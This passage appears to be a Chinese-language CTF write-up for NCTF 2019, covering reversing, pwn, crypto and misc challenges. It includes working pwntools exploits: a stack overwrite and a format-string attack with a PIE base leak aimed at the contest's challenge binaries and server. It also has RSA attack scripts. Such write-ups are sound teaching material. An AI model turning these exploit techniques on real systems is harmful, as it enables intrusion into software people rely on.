<span class="number">74</span> * a1[<span class="number">31</span>] + <span class="number">12</span> * a1[<span class="number">33</span>] + <span class="number">83</span> * a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">41447</span>== <span class="number">15</span> * a1[<span class="number">33</span>] + <span class="number">48</span> * a1[<span class="number">32</span>] + <span class="number">92</span> * a1[<span class="number">30</span>] + <span class="number">85</span> * a1[<span class="number">29</span>] + <span class="number">27</span> * a1[<span class="number">28</span>] + <span class="number">42</span> * a1[<span class="number">31</span>] + <span class="number">72</span> * a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">18098</span>== <span class="number">26</span> * a1[<span class="number">33</span>] + <span class="number">67</span> * a1[<span class="number">31</span>] + <span class="number">6</span> * a1[<span class="number">29</span>] + <span class="number">4</span> * a1[<span class="number">28</span>] + <span class="number">3</span> * a1[<span class="number">30</span>] + <span class="number">68</span> * a1[<span class="number">34</span>])</span><br><span class="line">solver.add(<span class="number">21335</span>== <span class="number">34</span> * a1[<span class="number">38</span>] + <span class="number">12</span> * a1[<span class="number">35</span>] + <span class="number">53</span> * a1[<span class="number">36</span>] + <span class="number">6</span> * a1[<span class="number">37</span>] + <span class="number">58</span> * a1[<span class="number">39</span>] + <span class="number">36</span> * a1[<span class="number">40</span>] + a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">46164</span>== <span class="number">27</span> * a1[<span class="number">39</span>] + <span class="number">73</span> * a1[<span class="number">38</span>] + <span class="number">12</span> * a1[<span class="number">37</span>] + <span class="number">83</span> * a1[<span class="number">35</span>] + <span class="number">85</span> * a1[<span class="number">36</span>] + <span class="number">96</span> * a1[<span class="number">40</span>] + <span class="number">52</span> * a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">38698</span>== <span class="number">24</span> * a1[<span class="number">37</span>] + <span class="number">78</span> * a1[<span class="number">35</span>] + <span class="number">53</span> * a1[<span class="number">36</span>] + <span class="number">36</span> * a1[<span class="number">38</span>] + <span class="number">86</span> * a1[<span class="number">39</span>] + <span class="number">25</span> * a1[<span class="number">40</span>] + <span class="number">46</span> * a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">39084</span>== <span class="number">78</span> * a1[<span class="number">36</span>] + <span class="number">39</span> * a1[<span class="number">35</span>] + <span class="number">52</span> * a1[<span class="number">37</span>] + <span class="number">9</span> * a1[<span class="number">38</span>] + <span class="number">62</span> * a1[<span class="number">39</span>] + <span class="number">37</span> * a1[<span class="number">40</span>] + <span class="number">84</span> * a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">29205</span>== <span class="number">48</span> * a1[<span class="number">39</span>] + <span class="number">6</span> * a1[<span class="number">36</span>] + <span class="number">23</span> * a1[<span class="number">35</span>] + <span class="number">14</span> * a1[<span class="number">37</span>] + <span class="number">74</span> * a1[<span class="number">38</span>] + <span class="number">12</span> * a1[<span class="number">40</span>] + <span class="number">83</span> * a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">40913</span>== <span class="number">15</span> * a1[<span class="number">40</span>] + <span class="number">48</span> * a1[<span class="number">39</span>] + <span class="number">92</span> * a1[<span class="number">37</span>] + <span class="number">85</span> * a1[<span class="number">36</span>] + <span class="number">27</span> * a1[<span class="number">35</span>] + <span class="number">42</span> * a1[<span class="number">38</span>] + <span class="number">72</span> * a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">19117</span>== <span class="number">26</span> * a1[<span class="number">40</span>] + <span class="number">67</span> * a1[<span class="number">38</span>] + <span class="number">6</span> * a1[<span class="number">36</span>] + <span class="number">4</span> * a1[<span class="number">35</span>] + <span class="number">3</span> * a1[<span class="number">37</span>] + <span class="number">68</span> * a1[<span class="number">41</span>])</span><br><span class="line">solver.add(<span class="number">21786</span>== <span class="number">34</span> * a1[<span class="number">45</span>] + <span class="number">12</span> * a1[<span class="number">42</span>] + <span class="number">53</span> * a1[<span class="number">43</span>] + <span class="number">6</span> * a1[<span class="number">44</span>] + <span class="number">58</span> * a1[<span class="number">46</span>] + <span class="number">36</span> * a1[<span class="number">47</span>] + a1[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="number">46573</span>== <span class="number">27</span> * a1[<span class="number">46</span>] + <span class="number">73</span> * a1[<span class="number">45</span>] + <span class="number">12</span> * a1[<span class="number">44</span>] + <span class="number">83</span> * a1[<span class="number">42</span>] + <span class="number">85</span> * a1[<span class="number">43</span>] + <span class="number">96</span> * a1[<span class="number">47</span>] + <span class="number">52</span> * a1[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="number">38322</span>== <span class="number">24</span> * a1[<span class="number">44</span>] + <span class="number">78</span> * a1[<span class="number">42</span>] + <span class="number">53</span> * a1[<span class="number">43</span>] + <span class="number">36</span> * a1[<span class="number">45</span>] + <span class="number">86</span> * a1[<span class="number">46</span>] + <span class="number">25</span> * a1[<span class="number">47</span>] + <span class="number">46</span> * a1[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="number">41017</span>== <span class="number">78</span> * a1[<span class="number">43</span>] + <span class="number">39</span> * a1[<span class="number">42</span>] + <span class="number">52</span> * a1[<span class="number">44</span>] + <span class="number">9</span> * a1[<span class="number">45</span>] + <span class="number">62</span> * a1[<span class="number">46</span>] + <span class="number">37</span> * a1[<span class="number">47</span>] + <span class="number">84</span> * a1[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="number">29298</span>== <span class="number">48</span> * a1[<span class="number">46</span>] + <span class="number">6</span> * a1[<span class="number">43</span>] + <span class="number">23</span> * a1[<span class="number">42</span>] + <span class="number">14</span> * a1[<span class="number">44</span>] + <span class="number">74</span> * a1[<span class="number">45</span>] + <span class="number">12</span> * a1[<span class="number">47</span>] + <span class="number">83</span> * a1[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="number">43409</span>== <span class="number">15</span> * a1[<span class="number">47</span>] + <span class="number">48</span> * a1[<span class="number">46</span>] + <span class="number">92</span> * a1[<span class="number">44</span>] + <span class="number">85</span> * a1[<span class="number">43</span>] + <span class="number">27</span> * a1[<span class="number">42</span>] + <span class="number">42</span> * a1[<span class="number">45</span>] + <span class="number">72</span> * a1[<span class="number">48</span>])</span><br><span class="line">solver.add(<span class="number">19655</span>== <span class="number">26</span> * a1[<span class="number">47</span>] + <span class="number">67</span> * a1[<span class="number">45</span>] + <span class="number">6</span> * a1[<span class="number">43</span>] + <span class="number">4</span> * a1[<span class="number">42</span>] + <span class="number">3</span> * a1[<span class="number">44</span>] + <span class="number">68</span> * a1[<span class="number">48</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    f = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">        f+=chr(eval(str(solver.model().eval(a1[i]))))</span><br><span class="line">    <span class="keyword">print</span> f</span><br></pre></td></tr></table></figure><h2 id="0x02-DEBUG"><a href="#0x02-DEBUG" class="headerlink" title="0x02 DEBUG"></a>0x02 DEBUG</h2><ul><li>IDA动态调试即可拿到Flag。</li></ul><h1 id="0x02-Pwn"><a href="#0x02-Pwn" class="headerlink" title="0x02 Pwn"></a>0x02 Pwn</h1><h2 id="0x001"><a href="#0x001" class="headerlink" title="0x001"></a>0x001</h2><ul><li>pwntools直接连接得到flag。</li></ul><h2 id="0x002-pwn-me-100years-1"><a href="#0x002-pwn-me-100years-1" class="headerlink" title="0x002 pwn_me_100years(1)"></a>0x002 pwn_me_100years(1)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./pwn_me_1')</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'139.129.76.65'</span>,<span class="number">50004</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b * 0x4008D9')</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'yes\00'</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">16</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x66666666</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x003-pwn-me-100years-2"><a href="#0x003-pwn-me-100years-2" class="headerlink" title="0x003 pwn_me_100years(2)"></a>0x003 pwn_me_100years(2)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><ul><li><p>考察格式化字符串漏洞以及PIE绕过方式。</p></li><li><p>通过这道题,学到挺多的。</p></li></ul><h3 id="对开启PIE保护的程序下断的方法"><a href="#对开启PIE保护的程序下断的方法" class="headerlink" title="对开启PIE保护的程序下断的方法"></a>对开启PIE保护的程序下断的方法</h3><ul><li><p>首先是对于开启PIE保护的文件,如果我们要使用gdb调试的话,需要这么下断点:<br><code>b *$rebase(相对基址偏移)</code>,这个相对基址偏移可以在IDA中看到,就是在IDA里面看到的指令地址。但是需要gdb运行程序以后才能下断,gdb里面r了以后程序会直接运行下去,一般来说程序都有提示输入的函数,这时候我们先<code>r</code>然后直接<code>Ctrl + C</code>,然后下断即可。</p></li><li><p>或者通过<code>pie</code>命令可以得到基址。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191130233656.png" alt></p><ul><li>或者通过<code>vmmap</code>或者<code>libs</code>命令得到基址,这俩命令是等价的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191130233931.png" alt></p><ul><li>然后<code>真实地址 = 基址 + 偏移</code>,通过常规下断方法即可对真实地址下断。</li></ul><h3 id="PIE绕过"><a href="#PIE绕过" class="headerlink" title="PIE绕过"></a>PIE绕过</h3><ul><li><p>通过动态调试,我们可以知道<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191130234427.png" alt>这里的<code>buf</code>与<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191130234452.png" alt>这里的<code>dest</code>是同一块区域。我们可以<code>read</code>读入0x30个字节,但由于<code>strncpy</code>函数会覆盖掉前16个字节,所以我们可以利用后0x30-16个字节。</p></li><li><p>我们通过发送16个填充字符和一个<code>%p</code>(用来泄露地址),得到这个地址，由于开启了PIE保护，所以这个地址每次重新加载程序的时候都会变的。所以我们需要计算出来这个地址跟基址的偏移(偏移保持不变),以不变应万变。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191130234804.png" alt></p><ul><li><p>我们泄露出来的地址为<code>0x555555756080</code>。</p></li><li><p>由于我们的基址 = <code>0x555555554000</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191130235033.png" alt></p><ul><li><p>所以偏移<code>offset = 0x202080</code>。</p></li><li><p>那么每次程序的基址就等于<code>我们每次泄露出来的地址减去偏移offset</code>。</p></li></ul><h3 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h3><ul><li><p>剩下的就是格式化字符串漏洞了。</p></li><li><p>我们手动测出来格式化字符串漏洞的<code>offset = 6</code>。</p></li><li><p>下面构造payload,由于目标数值为0x66666666,太大了,我们分批来写。每次写入<code>0x6666</code>即<code>26214</code>,占两个字节。所以我们的payload为:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'%26214c%10$hn%11$hn'</span><span class="comment">#注意 %10$hn%11$hn,原因见下一行。</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">'a'</span>)<span class="comment">#补齐 让它占32字节,所以offset 需要加32/8 = 4。</span></span><br><span class="line">payload+=p64(target)+p64(target+<span class="number">2</span>)<span class="comment"># target+2 因为每次写入的占2字节,需要后移2字节。</span></span><br></pre></td></tr></table></figure><ul><li>完整exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote('139.129.76.65',50005)</span></span><br><span class="line">p = process(<span class="string">'./pwn_me_2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'%p.'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'preparing......\n.'</span>)</span><br><span class="line">s = p.recvuntil(<span class="string">'.'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">base =int(s,<span class="number">16</span>) -(<span class="number">0x555555756080</span><span class="number">-0x555555554000</span>)</span><br><span class="line">log.success(<span class="string">'s = '</span> + s)</span><br><span class="line">log.success(<span class="string">'base = '</span> + hex(base))</span><br><span class="line">target = base + <span class="number">0x2020e0</span></span><br><span class="line">log.success(<span class="string">'target = '</span> + hex(target))</span><br><span class="line"><span class="comment"># offset=6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%26214c%10$hn%11$hn'</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+=p64(target)+p64(target+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'want?\n'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'b * '</span> + hex(base+<span class="number">0xc2c</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-Crypto"><a href="#0x03-Crypto" class="headerlink" title="0x03 Crypto"></a>0x03 Crypto</h1><h2 id="0x001-Keyboard"><a href="#0x001-Keyboard" class="headerlink" title="0x001 Keyboard"></a>0x001 Keyboard</h2><ul><li>模拟手机九键输入法。</li></ul><p><code>ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</code></p><ul><li>o对应9,o出现了三次,对应字母y,以此类推…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127113543.png" alt><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127113543.png" alt></p><ul><li>写个解密脚本得到flag。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">s = <span class="string">'ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee'</span></span><br><span class="line">L = s.split()</span><br><span class="line">list = <span class="string">'qwertyuio'</span></span><br><span class="line">key = [<span class="string">''</span>,<span class="string">''</span>,<span class="string">'abc'</span>,<span class="string">'def'</span>,<span class="string">'ghi'</span>,<span class="string">'jkl'</span>,<span class="string">'mno'</span>,<span class="string">'pqrs'</span>,<span class="string">'tuv'</span>,<span class="string">'wxyz'</span>]</span><br><span class="line">flag = <span class="string">'NCTF&#123;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    n = list.index(i[<span class="number">0</span>]) + <span class="number">1</span></span><br><span class="line">    length = len(i)</span><br><span class="line">    flag += key[n][length<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> flag + <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="0x002-ChildRSA"><a href="#0x002-ChildRSA" class="headerlink" title="0x002 ChildRSA"></a>0x002 ChildRSA</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122019.png" alt></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><ul><li><p>根据题目,pq应该会比较相近。尝试yafu分解。</p></li><li><p>直接在命令行里面传入n的话,会提示<code>mismatched parens</code>,我们新建一个<code>n.txt</code>,在里面写入n的值,注意最后要加换行!然后用在命令行用命令<code>yafu-x64.exe &quot;factor(@)&quot; -batchfile n.txt</code>。然后几秒钟后就得到了pq的值。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122314.png" alt></p><ul><li>那么现在pqnec都知道了,直接求解m即可。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =gmpy2.mpz(<span class="number">178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line"></span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line">c=gmpy2.mpz(<span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span>)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h3 id="出题人的意思"><a href="#出题人的意思" class="headerlink" title="出题人的意思"></a>出题人的意思</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122558.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122615.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122641.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122726.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127122801.png" alt></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pollard_p_1</span><span class="params">(N)</span>:</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = a</span><br><span class="line">        <span class="comment"># precompute</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80000</span>):</span><br><span class="line">            f = pow(f, n, N)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">80000</span>, <span class="number">104729</span>+<span class="number">1</span>):</span><br><span class="line">            f = pow(f, n, N)</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">                d = GCD(f<span class="number">-1</span>, N)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">1</span> &lt; d &lt; N:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        print(a)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">n = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">print( Pollard_p_1(n) )</span><br></pre></td></tr></table></figure><ul><li>然后就是正常的解密了。</li></ul><h2 id="0x003-BabyRSA"><a href="#0x003-BabyRSA" class="headerlink" title="0x003 BabyRSA"></a>0x003 BabyRSA</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127121748.png" alt></p><ul><li><p>根据代码可以得知p和q是两个相邻的大素数。我们知道了d也知道e。</p></li><li><p>那么根据<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127163736.png" alt>,可以得到<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127163755.png" alt>,即<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127163813.png" alt>,又因为<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127163824.png" alt>,可得<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127163835.png" alt>。</p></li><li><p>那么就可以去爆破这个k,从而得到phi (n)。又因为pq是相邻两个大素数,大小差不多,那么<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191127164033.png" alt>,可以通过对phi (n)开根号,在根的附近寻找能够整除phi (n)的数,找到了就是p-1或者q-1,从而获得n,然后获得flag。</p></li><li><p>爆破k的脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line"></span><br><span class="line">kphi = e*d<span class="number">-1</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> kphi % k == <span class="number">0</span>:</span><br><span class="line">        phi = kphi/k</span><br><span class="line">        root = gmpy2.iroot(phi,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(root<span class="number">-2000</span>,root+<span class="number">2000</span>):</span><br><span class="line">            <span class="keyword">if</span> phi%(p<span class="number">-1</span>) == <span class="number">0</span>:</span><br><span class="line">                q = phi/(p<span class="number">-1</span>) + <span class="number">1</span></span><br><span class="line">                n = p*q</span><br><span class="line"><span class="keyword">print</span> n</span><br></pre></td></tr></table></figure><ul><li><p>注意,求根的时候不能用math.sqrt(),因为我们的数太大了,所以选用gmpy2.iroot来求根。</p></li><li><p>拿到n以后 我们知道了c、d、n,就能得到flag了。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">20504410400689593147555423519748552911043953672384279941891248025669880071955689910745346059912207834678616929754630745200468809255570512858402517731386845102068518526083204515529722020838820298462738678975209356676388502939085453171394815425395725474939507125791503971901391160281053434736568444206521730614657374829699726508866785788560535563942763310947712705794037018923200012913764739541376498612705175338275240811678877555686071062194582532893834084310206118431999312683235411343368211050374393142007595048334570583332870345562866644227976136918563977178593767417393759453878935459889615269219607083777401455983</span></span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1 id="0x04-Misc"><a href="#0x04-Misc" class="headerlink" title="0x04 Misc"></a>0x04 Misc</h1><h2 id="0x001-Pip-install"><a href="#0x001-Pip-install" class="headerlink" title="0x001 Pip install"></a>0x001 Pip install</h2><ul><li>Win下<code>pip install nctf-2019-installme</code>,会出现一个链接,打开链接下载.gz压缩包,在setup.py里面有flag的base64,解码即可。</li></ul><h2 id="0x002-a-good-idea"><a href="#0x002-a-good-idea" class="headerlink" title="0x002 a good idea"></a>0x002 a good idea</h2><ul><li><p>binwalk拿到to.png和to_do.png。</p></li><li><p>据说用Stegsolve的Image combiner可以拿到二维码。</p></li><li><p>脚本解题,脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img1=Image.open(<span class="string">"C:\\Users\\LiuLian\\Desktop\\misc\\to.png"</span>)</span><br><span class="line">im1=img1.load()</span><br><span class="line">img2=Image.open(<span class="string">"C:\\Users\\LiuLian\\Desktop\\misc\\to_do.png"</span>)</span><br><span class="line">im2=img2.load()</span><br><span class="line">width=<span class="number">290</span></span><br><span class="line">height=<span class="number">289</span></span><br><span class="line">image=Image.new(<span class="string">'RGB'</span>,(width,height))</span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(img1.size[<span class="number">0</span>]):</span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> range(img1.size[<span class="number">1</span>]):</span><br><span class="line">		<span class="keyword">if</span>(im1[x,y]!=im2[x,y]):</span><br><span class="line">			image.putpixel((x,y),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure><ul><li>拿到二维码扫码可得flag。</li></ul><h2 id="0x003-What’s-this"><a href="#0x003-What’s-this" class="headerlink" title="0x003 What’s this"></a>0x003 What’s this</h2><ul><li>从流量包里提取出来<code>What1s7his.txt</code>,base64隐写解码得到flag。</li></ul><h2 id="0x004-键盘侠"><a href="#0x004-键盘侠" class="headerlink" 